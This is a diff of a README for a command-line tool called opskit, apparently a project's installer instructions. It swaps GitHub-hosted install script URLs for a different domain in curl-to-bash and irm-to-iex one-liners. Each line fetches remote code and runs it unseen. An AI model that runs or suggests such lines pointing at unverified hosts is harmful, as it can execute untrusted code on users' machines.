@@ -31,19 +31,19 @@ No web UI, no agent, no daemon. Just run it and go.
 
 ```bash
 # Linux / macOS
-curl -fsSL https://raw.githubusercontent.com/ougato/opskit-cli/main/install.sh | bash
+curl -fsSL https://file.icerror.top/d/install/opskit.sh | bash
 opskit
 ```
 
 ```powershell
 # Windows PowerShell
-irm https://raw.githubusercontent.com/ougato/opskit-cli/main/install.ps1 | iex
+irm https://file.icerror.top/d/install/opskit.ps1 | iex
 opskit
 ```
 
 ```cmd
 rem Windows CMD
-powershell -c "irm https://raw.githubusercontent.com/ougato/opskit-cli/main/install.ps1 | iex"
+powershell -c "irm https://file.icerror.top/d/install/opskit.ps1 | iex"
 opskit
 ```
 
